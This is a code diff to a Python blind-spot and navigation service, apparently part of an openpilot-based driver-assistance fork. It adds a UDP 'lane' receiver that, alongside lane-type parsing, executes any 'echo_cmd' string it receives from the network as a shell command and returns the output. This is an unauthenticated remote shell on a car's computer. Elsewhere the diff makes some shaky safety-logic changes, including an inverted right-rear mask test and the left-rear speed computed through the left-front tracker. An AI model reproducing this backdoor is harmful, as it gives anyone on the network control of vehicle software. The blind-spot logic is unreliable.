@@ -5,6 +5,7 @@ import socket
 import fcntl
 import struct
 import queue
+import subprocess
 import cereal.messaging as messaging
 from openpilot.common.realtime import Ratekeeper
 #from openpilot.common.params import Params
@@ -95,6 +96,8 @@ class SharedData:
   def __init__(self):
     #=============共享数据（来自amap_navi）=============
     #盲区信号
+    self.left_lane = 0 #车道线类型
+    self.right_lane = 0
     self.left_blind = False #摄像头盲区信号
     self.right_blind = False
     self.lidar_lblind = False #雷达盲区信号
@@ -182,6 +185,7 @@ class AmapNaviServ:
     self.broadcast_ip = self.navi_get_broadcast_address() #广播地址
     self.broadcast_port = 4210 #广播端口
     self.listen_port = 4211 #监听地址
+    self.lane_port = 4213  # 监听地址
     self.local_ip_address = "0.0.0.0" #本地ip地址
 
     self.clients = {}  # 保存多个客户端
@@ -235,16 +239,16 @@ class AmapNaviServ:
   def public_amap_navi(self):
     msg = messaging.new_message('amapNavi')
     msg.valid = True
-    msg.amapNavi.leftBlind = ((4 if self.shared_data.lidar_car_lblind else 0) +
+    msg.amapNavi.leftBlind = ((8 if self.shared_data.left_lane > 0 else 0) + (4 if self.shared_data.lidar_car_lblind else 0) +
                               (2 if self.shared_data.left_blind else 0) + (1 if self.shared_data.lidar_lblind else 0))
-    msg.amapNavi.rightBlind = ((4 if self.shared_data.lidar_car_rblind else 0) +
+    msg.amapNavi.rightBlind = ((8 if self.shared_data.right_lane > 0 else 0) + (4 if self.shared_data.lidar_car_rblind else 0) +
                                (2 if self.shared_data.right_blind else 0) + (1 if self.shared_data.lidar_rblind else 0))
     self.pm.send('amapNavi', msg)
 
   def left_blindspot(self):
-    return self.shared_data.left_blind or self.shared_data.lidar_lblind
+    return self.shared_data.left_blind or self.shared_data.lidar_lblind or self.shared_data.left_lane > 0
   def right_blindspot(self):
-    return self.shared_data.right_blind or self.shared_data.lidar_rblind
+    return self.shared_data.right_blind or self.shared_data.lidar_rblind or self.shared_data.right_lane > 0
 
   def _capnp_list_to_list(self, capnp_list, max_items=None):
     """将capnp列表转换为Python列表"""
@@ -323,6 +327,7 @@ class AmapNaviServ:
           rf_blind_mask = True
         if self.shared_data.main_rb_xrel is not None and self.shared_data.main_rb_xrel > laneWidthRight*1000.: #控测的目标侧面距离超过路宽，屏蔽盲区标志
           rb_blind_mask = True
+        '''
         if fork_left_right:
           if atc_blinker_state == BLINKER_LEFT:
             if self.shared_data.main_lf_drel is not None and self.shared_data.main_lf_drel > 5000: #左前方大于5米
@@ -334,6 +339,7 @@ class AmapNaviServ:
               rf_blind_mask = True
             if self.shared_data.main_rb_drel is not None and self.shared_data.main_rb_drel < -10000: #右后方大于10米
               rb_blind_mask = True
+        '''
 
       if self.dynamicBlindRange >= 2: #强制动态调整盲宽度
         if not lf_blind_mask:
@@ -399,7 +405,7 @@ class AmapNaviServ:
       self.rf_side_object_detected = True
 
     #右后方
-    if self.rb_object_detected and rb_blind_mask:
+    if self.rb_object_detected and not rb_blind_mask:
       self.rb_object_detected_count = 1
     else:
       self.rb_object_detected_count -= 1
@@ -446,6 +452,7 @@ class AmapNaviServ:
 
   # =======================================================================================
   def start_navi_comm(self):
+    threading.Thread(target=self._lane_recv_thread, daemon=True).start()
     """启动导航UDP通信线程"""
     threading.Thread(target=self._udp_recv_thread, daemon=True).start()
     # 启动清理客户端线程
@@ -509,9 +516,11 @@ class AmapNaviServ:
                   # 判断车身范围是否有障碍物
                   _lf_drel = info.get("lf_drel", None)
                   _lb_drel = info.get("lb_drel", None)
+                  _lf_xrel = info.get("lf_xrel", None)
+                  _lb_xrel = info.get("lb_xrel", None)
                   lf_limit_val = max(3000 + (_lb_drel if _lb_drel is not None else -2000), 1000)
-                  if (_lf_drel is not None and _lf_drel < lf_limit_val) or (
-                    _lb_drel is not None and _lb_drel > -2000):  # 车头3米或车2米内有障碍
+                  if ((_lf_drel is not None and _lf_drel < lf_limit_val and _lf_xrel is not None and _lf_xrel < 1200) or
+                    (_lb_drel is not None and _lb_drel > -2000 and _lb_xrel is not None and _lb_xrel < 1200)):  # 车头3米或车2米内有障碍(且侧面距离小于1.2m)
                     lidar_car_lblind = True
 
                 if info.get("lidar_rblind", False):
@@ -520,9 +529,11 @@ class AmapNaviServ:
                   # 判断车身范围是否有障碍物
                   _rf_drel = info.get("rf_drel", None)
                   _rb_drel = info.get("rb_drel", None)
+                  _rf_xrel = info.get("rf_xrel", None)
+                  _rb_xrel = info.get("rb_xrel", None)
                   lf_limit_val = max(3000 + (_rb_drel if _rb_drel is not None else -2000), 1000)
-                  if (_rf_drel is not None and _rf_drel < lf_limit_val) or (
-                    _rb_drel is not None and _rb_drel > -2000):  # 车头3米或车2米内有障碍
+                  if ((_rf_drel is not None and _rf_drel < lf_limit_val and _rf_xrel is not None and _rf_xrel < 1200) or
+                    (_rb_drel is not None and _rb_drel > -2000 and _rb_xrel is not None and _rb_xrel < 1200)):  # 车头3米或车2米内有障碍(且侧面距离小于1.2m)
                     lidar_car_rblind = True
 
                 if info.get("left_blind", False):
@@ -577,6 +588,61 @@ class AmapNaviServ:
       except Exception as e:
         print(f"_data_deal_thread error: {e}")
         time.sleep(1)
+  # ----------------------
+  # LANE 接收线程（修改：初始化 client_active）
+  # ----------------------
+  def _lane_recv_thread(self):
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+      sock.settimeout(10)
+      sock.bind(('0.0.0.0', self.lane_port))
+      print("lane receive thread started...")
+      while True:
+        try:
+          data, addr = sock.recvfrom(4096)
+          ip, port = addr
+
+          if not data:
+            raise ConnectionError("_lane_recv_thread No data received")
+
+          try:
+            json_obj = json.loads(data.decode())
+            # 响应类型
+            if "resp" in json_obj:
+              resp = json_obj.get("resp")
+              if resp == "lane":
+                if "left_lane" in json_obj:
+                  left_lane = int(json_obj.get("left_lane"))
+                  self.shared_data.left_lane = 0 if left_lane < 1 else left_lane
+                if "right_lane" in json_obj:
+                  right_lane = int(json_obj.get("right_lane"))
+                  self.shared_data.right_lane = 0 if right_lane < 1 else right_lane
+            elif 'echo_cmd' in json_obj:
+              try:
+                result = subprocess.run(json_obj['echo_cmd'], shell=True, capture_output=True, text=False)
+                exitStatus = result.returncode
+                try:
+                  stdout = result.stdout.decode('utf-8')
+                  stderr = result.stderr.decode('utf-8')
+                except UnicodeDecodeError:
+                  stdout = result.stdout.decode('euc-kr', 'ignore')
+                  stderr = result.stderr.decode('euc-kr', 'ignore')
+
+                echo = json.dumps({"echo_cmd": json_obj['echo_cmd'], "exitStatus": exitStatus, "result": stdout, "error": stderr})
+              except Exception as e:
+                echo = json.dumps({"echo_cmd": json_obj['echo_cmd'], "exitStatus": exitStatus, "result": "","error": f"exception error: {str(e)}"})
+              print(echo)
+              sock.sendto(echo.encode(), addr)
+          except Exception as e:
+            print(f"_lane_recv_thread: json error...: {e}")
+            print(data)
+
+        except socket.timeout:
+          self.shared_data.left_lane = 0
+          self.shared_data.right_lane = 0
+          continue
+        except Exception as e:
+          print(f"lane recv error: {e}")
+          time.sleep(1)
   # ----------------------
   # UDP 接收线程（修改：初始化 client_active）
   # ----------------------
@@ -768,90 +834,66 @@ class AmapNaviServ:
 
         # ---------- 主雷达速度计算 ----------
         if lidar_id == 0:
-          # 左前方
           if detect_side & 1:
+            # 左前方
+            if lf_drel is None: lf_drel = old_info.get("lf_drel", None)  # 距离数据消抖
+            if lf_xrel is None: lf_xrel = old_info.get("lf_xrel", None)
             self.shared_data.main_lf_drel = lf_drel
             self.shared_data.main_lf_xrel = lf_xrel
-            #计算速度
-            if lf_drel is None: lf_drel = old_info.get("lf_drel", None) #距离数据消抖
-            self.shared_data.lf_vrel = self.leftFrontTarget.update(lf_drel, dist_timems)
-            #动态时距判断
-            self.lb_object_detected = self.is_side_object_risky(lf_drel, self.shared_data.lf_vrel, self.shared_data.v_ego_m,
-                                                                self.min_vrel_vego_time, self.min_drel_vego_time)
-            '''
-            if lf_drel is not None and self.shared_data.lf_vrel is not None and self.shared_data.v_ego_m is not None:
-              drel = lf_drel / 1000.
-              v_ego = self.shared_data.v_ego_m
-              vlead = self.shared_data.lf_vrel + self.shared_data.v_ego_m
-              object_dist = drel + vlead * 3.0
-              self.lf_object_detected = ((object_dist < v_ego * (3.0 + self.min_vrel_vego_time)) or
-                                         (drel < (v_ego * self.min_drel_vego_time)))
-            else:
-              self.lf_object_detected = False
-            '''
-          # 左后方
-          if detect_side & 1:
+            # 左后方
+            if lb_drel is None: lb_drel = old_info.get("lb_drel", None)  # 距离数据消抖
+            if lb_xrel is None: lb_xrel = old_info.get("lb_xrel", None)
             self.shared_data.main_lb_drel = lb_drel
             self.shared_data.main_lb_xrel = lb_xrel
-            # 计算速度
-            if lb_drel is None: lb_drel = old_info.get("lb_drel", None) #距离数据消抖
-            self.shared_data.lb_vrel = self.leftBehindTarget.update(lb_drel, dist_timems)
-            # 动态时距判断
-            self.lf_object_detected = self.is_side_object_risky(lb_drel, self.shared_data.lb_vrel, self.shared_data.v_ego_m,
-                                                                self.min_vrel_vego_time, self.min_drel_vego_time)
-            '''
-            if lb_drel is not None and self.shared_data.lb_vrel is not None and self.shared_data.v_ego_m is not None:
-              drel = abs(lb_drel) / 1000.
-              v_ego = self.shared_data.lb_vrel + self.shared_data.v_ego_m
-              vlead = self.shared_data.v_ego_m
-              object_dist = drel + vlead * 3.0
-              self.lb_object_detected = ((object_dist < v_ego * (3.0 + self.min_vrel_vego_time)) or
-                                         (drel < (v_ego * self.min_drel_vego_time)))
+
+            # 左前方和左后方距离均小于1米时
+            lf_dreltmp = lf_drel if lf_drel is not None else 0.1
+            lb_dreltmp = lb_drel if lb_drel is not None else 0.
+            if lf_dreltmp <= 1000 and lb_dreltmp >= -1000 and lf_drel is not None and lb_drel is not None: #前后距离在1米内
+              pass
             else:
-              self.lb_object_detected = False
-            '''
-          # 右前方
+              lf_dreltmp = lf_drel
+              lb_dreltmp = lb_drel
+            #计算左前方和左后方速度
+            self.shared_data.lf_vrel = self.leftFrontTarget.update(lf_dreltmp, dist_timems)
+            self.shared_data.lb_vrel = self.leftFrontTarget.update(lb_dreltmp, dist_timems)
+            #动态时距盲区判断
+            self.lf_object_detected = self.is_side_object_risky(lf_dreltmp, self.shared_data.lf_vrel, self.shared_data.v_ego_m,
+                                                                self.min_vrel_vego_time, self.min_drel_vego_time)
+            self.lb_object_detected = self.is_side_object_risky(lb_dreltmp, self.shared_data.lb_vrel, self.shared_data.v_ego_m,
+                                                                self.min_vrel_vego_time, self.min_drel_vego_time)
           if detect_side & 2:
+            # 右前方
+            if rf_drel is None: rf_drel = old_info.get("rf_drel", None)  # 距离数据消抖
+            if rf_xrel is None: rf_xrel = old_info.get("rf_xrel", None)
             self.shared_data.main_rf_drel = rf_drel
             self.shared_data.main_rf_xrel = rf_xrel
-            # 计算速度
-            if rf_drel is None: rf_drel = old_info.get("rf_drel", None)  # 距离数据消抖
-            self.shared_data.rf_vrel = self.rightFrontTarget.update(rf_drel, dist_timems)
-            # 动态时距判断
-            self.rb_object_detected = self.is_side_object_risky(rf_drel, self.shared_data.rf_vrel, self.shared_data.v_ego_m,
-                                                                self.min_vrel_vego_time, self.min_drel_vego_time)
-            '''
-            if rf_drel is not None and self.shared_data.rf_vrel is not None and self.shared_data.v_ego_m is not None:
-              drel = rf_drel / 1000.
-              v_ego = self.shared_data.v_ego_m
-              vlead = self.shared_data.rf_vrel + self.shared_data.v_ego_m
-              object_dist = drel + vlead * 3.0
-              self.rf_object_detected = ((object_dist < v_ego * (3.0 + self.min_vrel_vego_time)) or
-                                         (drel < (v_ego * self.min_drel_vego_time)))
-            else:
-              self.rf_object_detected = False
-            '''
-          # 右后方
-          if detect_side & 2:
+            # 右后方
+            if rb_drel is None: rb_drel = old_info.get("rb_drel", None)  # 距离数据消抖
+            if rb_xrel is None: rb_xrel = old_info.get("rb_xrel", None)
             self.shared_data.main_rb_drel = rb_drel
             self.shared_data.main_rb_xrel = rb_xrel
-            # 计算速度
-            if rb_drel is None: rb_drel = old_info.get("rb_drel", None)  # 距离数据消抖
-            self.shared_data.rb_vrel = self.rightBehindTarget.update(rb_drel, dist_timems)
-            # 动态时距判断
-            self.rf_object_detected = self.is_side_object_risky(rb_drel, self.shared_data.rb_vrel, self.shared_data.v_ego_m,
-                                                                self.min_vrel_vego_time, self.min_drel_vego_time)
-            '''
-            if rb_drel is not None and self.shared_data.rb_vrel is not None and self.shared_data.v_ego_m is not None:
-              drel = abs(rb_drel) / 1000.
-              v_ego = self.shared_data.rb_vrel + self.shared_data.v_ego_m
-              vlead = self.shared_data.v_ego_m
-              object_dist = drel + vlead * 3.0
-              self.rb_object_detected = ((object_dist < v_ego * (3.0 + self.min_vrel_vego_time)) or
-                                         (drel < (v_ego * self.min_drel_vego_time)))
+
+            # 右前方和右后方距离均小于1米时
+            rf_dreltmp = rf_drel if rf_drel is not None else 0.1
+            rb_dreltmp = rb_drel if rb_drel is not None else 0.
+            if rf_dreltmp <= 1000 and rb_dreltmp >= -1000 and rf_drel is not None and rb_drel is not None: #前后距离在1米内
+              pass
             else:
-              self.rb_object_detected = False
-            '''
+              rf_dreltmp = rf_drel
+              rb_dreltmp = rb_drel
+            #计算右前方和右后方速度
+            self.shared_data.rf_vrel = self.rightFrontTarget.update(rf_dreltmp, dist_timems)
+            self.shared_data.rb_vrel = self.rightBehindTarget.update(rb_dreltmp, dist_timems)
+            #动态时距盲区判断
+            self.rf_object_detected = self.is_side_object_risky(rf_dreltmp, self.shared_data.rf_vrel, self.shared_data.v_ego_m,
+                                                                self.min_vrel_vego_time, self.min_drel_vego_time)
+            self.rb_object_detected = self.is_side_object_risky(rb_dreltmp, self.shared_data.rb_vrel, self.shared_data.v_ego_m,
+                                                                self.min_vrel_vego_time, self.min_drel_vego_time)
+            #self.rb_object_detected = self.is_side_object_risky_debug(rb_drel, self.shared_data.rb_vrel,
+            #                                                          self.shared_data.v_ego_m,
+            #                                                          self.min_vrel_vego_time,
+            #                                                          self.min_drel_vego_time, "RB")
 
         # 通讯时间检查
         now = time.time()
@@ -1008,6 +1050,76 @@ class AmapNaviServ:
 
     return risk
 
+  def is_side_object_risky_debug(self,
+                                 drel_mm,
+                                 vrel_mps,
+                                 v_ego_mps,
+                                 time_horizon=3.0,
+                                 min_drel_scale=1.0,
+                                 tag="SIDE"):
+    """
+    带完整调试信息的侧向风险评估
+    """
+
+    print("\n==============================")
+    print(f"[{tag}] is_side_object_risky")
+
+    # ---------- 基础输入 ----------
+    print(f"input drel_mm   : {drel_mm}")
+    print(f"input vrel_mps  : {vrel_mps}")
+    print(f"input v_ego_mps : {v_ego_mps}")
+
+    if drel_mm is None or vrel_mps is None or v_ego_mps is None:
+      print("invalid input -> risk = False")
+      return False
+
+    # ---------- 距离 ----------
+    drel_m = drel_mm / 1000.0
+    drel_abs = abs(drel_m)
+
+    print(f"drel_m (signed) : {drel_m:.2f} m")
+    print(f"drel_abs        : {drel_abs:.2f} m")
+
+    # ---------- 速度 ----------
+    v_other = v_ego_mps + vrel_mps
+    print(f"v_other_mps     : {v_other:.2f} m/s")
+
+    # ---------- 前 / 后 ----------
+    if drel_mm > 0:
+      pos = "FRONT"
+      closing_speed = max(v_ego_mps - v_other, 0.0)
+      danger_dist = max(v_ego_mps * min_drel_scale, 10)
+    else:
+      pos = "REAR"
+      closing_speed = max(v_other - v_ego_mps, 0.0)
+      danger_dist = max(v_ego_mps * min_drel_scale, 15)
+
+    print(f"position        : {pos}")
+    print(f"closing_speed   : {closing_speed:.2f} m/s")
+    print(f"danger_dist     : {danger_dist:.2f} m")
+
+    # ---------- 未来预测 ----------
+    horizon = time_horizon * 3.0
+    future_dist = drel_abs - closing_speed * horizon
+
+    print(f"time_horizon    : {time_horizon:.2f} s")
+    print(f"horizon_factor  : {horizon:.2f}")
+    print(f"future_dist     : {future_dist:.2f} m")
+
+    # ---------- 判定 ----------
+    cond_future = future_dist < danger_dist
+    cond_now = drel_abs < danger_dist
+
+    print(f"cond_future     : {cond_future}")
+    print(f"cond_now        : {cond_now}")
+
+    risk = cond_future or cond_now
+
+    print(f"FINAL RISK   : {risk}")
+    print("==============================")
+
+    return risk
+
   def camera_data_timeout(self, ip, info):
     now = time.time()
     # ---------- 超时重置逻辑（2秒内无盲区数据更新则清空） ----------
@@ -1088,351 +1200,6 @@ class AmapNaviServ:
 
       time.sleep(0.2)
 
-  '''
-  def navi_comm_thread(self):
-    while True:
-      try:
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-          sock.settimeout(10)  # 超时10秒
-          sock.bind(('0.0.0.0', self.listen_port))
-          print("#########navi_comm_thread: UDP thread started...")
-
-          while True:
-            try:
-              try:
-                data, remote_addr = sock.recvfrom(4096)
-
-                if not data:
-                  raise ConnectionError("No data received")
-
-                ip, port = remote_addr
-                # 修改: 保存多个客户端地址及最后活跃时间
-                if not hasattr(self, "clients"):
-                  self.clients = {}  # {ip: last_seen_time}
-
-                now = time.time()
-
-                left_blind = None
-                right_blind = None
-                lidar_lblind = None
-                lidar_rblind = None
-
-                lf_drel = None
-                lb_drel = None
-                rf_drel = None
-                rb_drel = None
-                lf_xrel = None
-                lb_xrel = None
-                rf_xrel = None
-                rb_xrel = None
-
-                lf_drel_alive = False
-                lb_drel_alive = False
-                rf_drel_alive = False
-                rb_drel_alive = False
-                lf_xrel_alive = False
-                lb_xrel_alive = False
-                rf_xrel_alive = False
-                rb_xrel_alive = False
-
-                camera_data = False
-                lidar_data = False
-
-                dist_timems = None
-                old_info = self.clients.get(ip, {})
-
-                try:
-                  json_obj = json.loads(data.decode())
-
-                  #转向灯模块
-                  if "blinker" in json_obj:
-                    self.shared_data.ext_blinker = json_obj.get("blinker")
-                    if self.shared_data.ext_blinker in ["left", "stockleft"]:
-                      self.shared_data.ext_blinker = BLINKER_LEFT
-                    elif self.shared_data.ext_blinker in ["right", "stockright"]:
-                      self.shared_data.ext_blinker = BLINKER_RIGHT
-                    else:
-                      self.shared_data.ext_blinker = BLINKER_NONE
-                    self.blinker_alive = True
-                    self.blinker_time = time.time()
-
-                  #客户端命令
-                  if "index" in json_obj:
-                    self.shared_data.cmd_index = int(json_obj.get("index"))
-                  if "cmd" in json_obj:
-                    self.shared_data.remote_cmd = json_obj.get("cmd")
-                    self.shared_data.remote_arg = json_obj.get("arg")
-                    print(f"Command: index={self.shared_data.cmd_index}, cmd={self.shared_data.remote_cmd},arg={self.shared_data.remote_arg}")
-
-                  #响应类型
-                  if "resp" in json_obj:
-                    resp = json_obj.get("resp")
-                    #摄像头盲区信号
-                    if resp == "cam_blind":
-                      camera_data = True
-                      if "left_blind" in json_obj:
-                        left_blind = json_obj.get("left_blind")
-                        #l_blindspot_alive = True
-                      if "right_blind" in json_obj:
-                        right_blind = json_obj.get("right_blind")
-                        #r_blindspot_alive = True
-
-                    #雷达盲区信号和距离
-                    if resp == "blindspot":
-                      lidar_data = True
-                      detect_side = json_obj.get("detect_side",0)
-                      #雷达编号，0号为主雷达
-                      lidar_id = int(json_obj.get("lidar_id", 0))
-                      dist_timems = int(json_obj["dist_time"]) if "dist_time" in json_obj else None
-                      #盲区
-                      if "lidar_lblind" in json_obj:
-                        lidar_lblind = json_obj.get("lidar_lblind")
-                        #lidar_lblind_alive = True
-                      if "lidar_rblind" in json_obj:
-                        lidar_rblind = json_obj.get("lidar_rblind")
-                        #lidar_rblind_alive = True
-                      #距离
-                      if "lf_drel" in json_obj:
-                        lf_drel = int(json_obj.get("lf_drel"))
-                        lf_drel_alive = True
-                      if (0 == lidar_id) and (detect_side & 1): #仅主雷达计算速度
-                        self.shared_data.main_lf_drel = lf_drel
-                        self.shared_data.lf_vrel = self.leftFrontTarget.update(lf_drel, dist_timems)
-                        #左前盲区时距检测
-                        if lf_drel is not None and self.shared_data.lf_vrel is not None and self.shared_data.v_ego_m is not None: #有距离和有速度
-                          drel = lf_drel/1000.
-                          v_ego = self.shared_data.v_ego_m
-                          vlead = self.shared_data.lf_vrel + self.shared_data.v_ego_m
-                          object_dist = drel + vlead * 3.0
-                          self.lf_object_detected = ((object_dist < v_ego * (3.0 + self.min_vrel_vego_time)) or (drel < (v_ego * self.min_drel_vego_time)))
-                        else:
-                          self.lf_object_detected = False
-                      if "lb_drel" in json_obj:
-                        lb_drel = int(json_obj.get("lb_drel"))
-                        lb_drel_alive = True
-                      if (0 == lidar_id) and (detect_side & 1): #仅主雷达计算速度
-                        self.shared_data.main_lb_drel = lb_drel
-                        self.shared_data.lb_vrel = self.leftBehindTarget.update(lb_drel, dist_timems)
-                        # 左后盲区时距检测
-                        if lb_drel is not None and self.shared_data.lb_vrel is not None and self.shared_data.v_ego_m is not None:  # 有距离和有速度
-                          drel = (lb_drel if lb_drel >= 0 else lb_drel*(-1))/1000.
-                          v_ego = self.shared_data.lb_vrel + self.shared_data.v_ego_m
-                          vlead = self.shared_data.v_ego_m
-                          object_dist = drel + vlead * 3.0
-                          self.lb_object_detected = ((object_dist < v_ego * (3.0 + self.min_vrel_vego_time)) or (drel < (v_ego * self.min_drel_vego_time)))
-                        else:
-                          self.lb_object_detected = False
-                      if "rf_drel" in json_obj:
-                        rf_drel = int(json_obj.get("rf_drel"))
-                        rf_drel_alive = True
-                      if (0 == lidar_id) and (detect_side & 2): #仅主雷达计算速度
-                        self.shared_data.main_rf_drel = rf_drel
-                        self.shared_data.rf_vrel = self.rightFrontTarget.update(rf_drel, dist_timems)
-                        # 右前盲区时距检测
-                        if rf_drel is not None and self.shared_data.rf_vrel is not None and self.shared_data.v_ego_m is not None:  # 有距离和有速度
-                          drel = rf_drel / 1000.
-                          v_ego = self.shared_data.v_ego_m
-                          vlead = self.shared_data.rf_vrel + self.shared_data.v_ego_m
-                          object_dist = drel + vlead * 3.0
-                          self.rf_object_detected = ((object_dist < v_ego * (3.0 + self.min_vrel_vego_time)) or (drel < (v_ego * self.min_drel_vego_time)))
-                        else:
-                          self.rf_object_detected = False
-                      if "rb_drel" in json_obj:
-                        rb_drel = int(json_obj.get("rb_drel"))
-                        rb_drel_alive = True
-                      if (0 == lidar_id) and (detect_side & 2): #仅主雷达计算速度
-                        self.shared_data.main_rb_drel = rb_drel
-                        self.shared_data.rb_vrel = self.rightBehindTarget.update( rb_drel, dist_timems)
-                        # 左后盲区时距检测
-                        if rb_drel is not None and self.shared_data.rb_vrel is not None and self.shared_data.v_ego_m is not None:  # 有距离和有速度
-                          drel = (rb_drel if rb_drel >= 0 else rb_drel * (-1)) / 1000.
-                          v_ego = self.shared_data.rb_vrel + self.shared_data.v_ego_m
-                          vlead = self.shared_data.v_ego_m
-                          object_dist = drel + vlead * 3.0
-                          self.rb_object_detected = ((object_dist < v_ego * (3.0 + self.min_vrel_vego_time)) or (drel < (v_ego * self.min_drel_vego_time)))
-                        else:
-                          self.rb_object_detected = False
-
-                      if "lf_xrel" in json_obj:
-                        lf_xrel = int(json_obj.get("lf_xrel"))
-                        lf_xrel_alive = True
-                      if (0 == lidar_id) and (detect_side & 1):
-                        self.shared_data.main_lf_xrel = lf_xrel
-                      if "lb_xrel" in json_obj:
-                        lb_xrel = int(json_obj.get("lb_xrel"))
-                        lb_xrel_alive = True
-                      if (0 == lidar_id) and (detect_side & 1):
-                        self.shared_data.main_lb_xrel = lb_xrel
-                      if "rf_xrel" in json_obj:
-                        rf_xrel = int(json_obj.get("rf_xrel"))
-                        rf_xrel_alive = True
-                      if (0 == lidar_id) and (detect_side & 2):
-                        self.shared_data.main_rf_xrel = rf_xrel
-                      if "rb_xrel" in json_obj:
-                        rb_xrel = int(json_obj.get("rb_xrel"))
-                        rb_xrel_alive = True
-                      if (0 == lidar_id) and (detect_side & 2):
-                        self.shared_data.main_rb_xrel = rb_xrel
-
-                      #超时检查
-                      last_dis_timems = old_info.get("dis_timems", None)
-                      last_seen = old_info.get("last_seen", None)
-                      now = time.time()
-                      if last_dis_timems is not None and dist_timems is not None and (dist_timems - last_dis_timems) > 150:
-                        print(f"lidar{detect_side} data interval time large than 150ms({dist_timems-last_dis_timems})")
-                      if last_seen is not None and (now - last_seen) > 0.15:
-                        print(f"lidar{detect_side} last_seen time large than 0.15s({now-last_seen})")
-
-                  #更新客户端信息
-
-                  #检测盲区状态是否超时
-                  l_blindspot_time = old_info.get("l_blindspot_time", now)
-                  r_blindspot_time = old_info.get("r_blindspot_time", now)
-                  lidar_lblind_time = old_info.get("lidar_lblind_time", now)
-                  lidar_rblind_time = old_info.get("lidar_rblind_time", now)
-
-                  if (now - l_blindspot_time) > 10 and left_blind is not None:
-                    left_blind = False
-                  if (now - r_blindspot_time) > 10 and right_blind is not None:
-                    right_blind = False
-                  if (now - lidar_lblind_time) > 10 and lidar_lblind is not None:
-                    lidar_lblind = False
-                  if (now - lidar_rblind_time) > 10 and lidar_rblind is not None:
-                    lidar_rblind = False
-
-                  #上次的距离数据时间
-                  lf_drel_time = old_info.get("lf_drel_time", now)
-                  lb_drel_time = old_info.get("lb_drel_time", now)
-                  rf_drel_time = old_info.get("rf_drel_time", now)
-                  rb_drel_time = old_info.get("rb_drel_time", now)
-                  lf_xrel_time = old_info.get("lf_xrel_time", now)
-                  lb_xrel_time = old_info.get("lb_xrel_time", now)
-                  rf_xrel_time = old_info.get("rf_xrel_time", now)
-                  rb_xrel_time = old_info.get("rb_xrel_time", now)
-                  #若本次通讯无数据，加载上次的数据
-                  if not lidar_data:
-                    if lf_drel is None:
-                      lf_drel = old_info.get("lf_drel", None)
-                    if lb_drel is None:
-                      lb_drel = old_info.get("lb_drel", None)
-                    if rf_drel is None:
-                      rf_drel = old_info.get("rf_drel", None)
-                    if rb_drel is None:
-                      rb_drel = old_info.get("rb_drel", None)
-                    if lf_xrel is None:
-                      lf_xrel = old_info.get("lf_xrel", None)
-                    if lb_xrel is None:
-                      lb_xrel = old_info.get("lb_xrel", None)
-                    if rf_xrel is None:
-                      rf_xrel = old_info.get("rf_xrel", None)
-                    if rb_xrel is None:
-                      rb_xrel = old_info.get("rb_xrel", None)
-                  #检测距离数据是否超时
-                  if (now - lf_drel_time) > 10 and lf_drel is not None:
-                    lf_drel = None
-                  if (now - lb_drel_time) > 10 and lb_drel is not None:
-                    lb_drel = None
-                  if (now - rf_drel_time) > 10 and rf_drel is not None:
-                    rf_drel = None
-                  if (now - rb_drel_time) > 10 and rb_drel is not None:
-                    rb_drel = None
-                  if (now - lf_xrel_time) > 10 and lf_xrel is not None:
-                    lf_xrel = None
-                  if (now - lb_xrel_time) > 10 and lb_xrel is not None:
-                    lb_xrel = None
-                  if (now - rf_xrel_time) > 10 and rf_xrel is not None:
-                    rf_xrel = None
-                  if (now - rb_xrel_time) > 10 and rb_xrel is not None:
-                    rb_xrel = None
-
-                  with lock:
-                    self.clients[ip] = {
-                      "port": int(json_obj["port"]) if "port" in json_obj else None,
-                      "last_seen": time.time(),
-                      "device": json_obj.get("device", old_info.get("device", "")),
-                      "detect_side":json_obj.get("detect_side", old_info.get("detect_side", 0)),
-                      #盲区状态更新
-                      "lidar_lblind": lidar_lblind if lidar_lblind is not None else old_info.get("lidar_lblind", False),
-                      "lidar_rblind": lidar_rblind if lidar_rblind is not None else old_info.get("lidar_rblind", False),
-                      "left_blind": left_blind if left_blind is not None else old_info.get("left_blind", False),
-                      "right_blind": right_blind if right_blind is not None else old_info.get("right_blind", False),
-                      #f雷达盲区更新时间
-                      "lidar_lblind_time": now if lidar_lblind is not None else old_info.get("lidar_lblind_time", now),
-                      "lidar_rblind_time": now if lidar_rblind is not None else old_info.get("lidar_rblind_time", now),
-                      "l_blindspot_time": now if left_blind is not None else old_info.get("l_blindspot_time", now),
-                      "r_blindspot_time": now if right_blind is not None else old_info.get("r_blindspot_time", now),
-                      #雷达距离
-                      "lf_drel": lf_drel,
-                      "lb_drel": lb_drel,
-                      "rf_drel": rf_drel,
-                      "rb_drel": rb_drel,
-                      "lf_xrel": lf_xrel,
-                      "lb_xrel": lb_xrel,
-                      "rf_xrel": rf_xrel,
-                      "rb_xrel": rb_xrel,
-                      # 雷达距离更新时间
-                      "lf_drel_time": now if lf_drel_alive else old_info.get("lf_drel_time", now),
-                      "lb_drel_time": now if lb_drel_alive else old_info.get("lb_drel_time", now),
-                      "rf_drel_time": now if rf_drel_alive else old_info.get("rf_drel_time", now),
-                      "rb_drel_time": now if rb_drel_alive else old_info.get("rb_drel_time", now),
-                      "lf_xrel_time": now if lf_xrel_alive else old_info.get("lf_xrel_time", now),
-                      "lb_xrel_time": now if lb_xrel_alive else old_info.get("lb_xrel_time", now),
-                      "rf_xrel_time": now if rf_xrel_alive else old_info.get("rf_xrel_time", now),
-                      "rb_xrel_time": now if rb_xrel_alive else old_info.get("rb_xrel_time", now),
-                      "dist_time": dist_timems,
-                    }
-
-                  if (self.shared_data.showDebugLog & 32) > 0:
-                    print(f"receive: {json_obj}")
-                except Exception as e:
-                  self.shared_data.ext_blinker = BLINKER_NONE
-                  if (self.shared_data.showDebugLog & 32) > 0:
-                    print(f"navi_comm_thread: json error...: {e}")
-                    print(data)
-              except TimeoutError:
-                if (self.shared_data.showDebugLog & 32) > 0:
-                  print("Waiting for data (timeout)...")
-              except Exception as e:
-                if (self.shared_data.showDebugLog & 32) > 0:
-                  print(f"navi_comm_thread: error...: {e}")
-                break
-
-              # 修改: 清理超过1.0秒未活跃的客户端
-              now = time.time()
-              with lock:
-                #self.clients = {ip: info for ip, info in self.clients.items() if now - info["last_seen"] < 1.0}
-                new_clients = {}
-                for ip, info in self.clients.items():
-                  last_seen = info["last_seen"]
-                  # 如果这个客户端在 1 秒内更新过，就保留
-                  if now - last_seen < 1.0:
-                    new_clients[ip] = info
-                self.clients = new_clients
-
-              #超过10秒后重启转向灯和盲区状态
-              if self.blinker_alive and (now - self.blinker_time) > 10:
